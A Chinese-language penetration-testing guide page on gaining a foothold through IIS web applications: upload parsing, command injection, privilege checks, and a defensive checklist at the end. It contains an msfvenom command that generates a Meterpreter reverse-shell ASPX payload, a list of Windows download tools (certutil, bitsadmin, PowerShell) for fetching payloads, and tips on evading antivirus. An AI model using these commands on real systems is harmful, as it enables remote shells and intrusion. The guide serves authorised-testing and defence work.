# Web 入口

上传被当成脚本执行、SQL 注入能出操作系统命令、命令注入能跑系统命令——这是配置和输入验证问题。本站不提供 webshell 文件。

## 先看身份

Web 入口拿到的通常是应用池 / 服务账户，不是交互管理员。

```text
whoami
whoami /priv
whoami /groups
```

有 `SeImpersonatePrivilege` 时，下一步往往是 [Windows 提权](/topics/windows-privesc)，而不是继续找 webshell 功能。

IIS 上 ASPX 跑在 `w3wp.exe` 里。进程内加载与「再丢一个 EXE 到磁盘」的检测面完全不同。

## 上传被解析

若上传目录可执行：

- 扩展名白名单是否只拦 `.exe` 却放行 `.aspx` / `.ashx` / `.asmx`
- 是否把用户文件放到了站点目录而不是不可执行的对象存储
- AV 会打公开 webshell 特征；「带管理界面的大马」几乎一定被杀

授权测试应证明「任意代码执行」即可：无害回显、`whoami`、写一个无害文件。完整 webshell 框架没有必要出现在报告附件里，更不应出现在公共网站。

公开生成器语法（自己在实验网生成，不要提交仓库）：

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=LHOST LPORT=LPORT -f aspx
```

更好的实验习惯：自己写最小回显页，功能越少越好。

## 注入之后的下载

已经能执行系统命令、但某一种下载器被拦时，换的是**传输工具**，不是重新打注入。实验室常见顺序（每次只换一个，记结果）：

```text
curl
certutil -urlcache -split -f
bitsadmin
powershell IWR / WebClient
```

命令长度和引号是隐形杀手。注入点经常截断。短第一阶段 + 把重活放到已验证的通道，比一条超长命令稳。

经典 ASP / `xp_cmdshell` 出的命令还要考虑编码和 `cmd /c` 的转义。

## 失败分类

| 现象 | 先查 |
|---|---|
| 上传成功但访问 404 / 下载文件 | 没当脚本解析；目录不是应用 |
| 页面被杀软隔离 | 特征；减功能，不要加功能 |
| 一种下载失败另一种成功 | 应用控制 / 代理；按矩阵换 |
| 命令无输出 | 长度、引号、工作目录、权限 |

## 防御侧

- 上传目录不可执行；文件名随机；内容类型与扩展名校验在服务端做
- 应用池用低权账户；能去掉 SeImpersonate 就去掉
- 禁用 `xp_cmdshell`；最小权限数据库角色
- WAF 不是主控；主控是「用户输入不要变成操作系统命令」
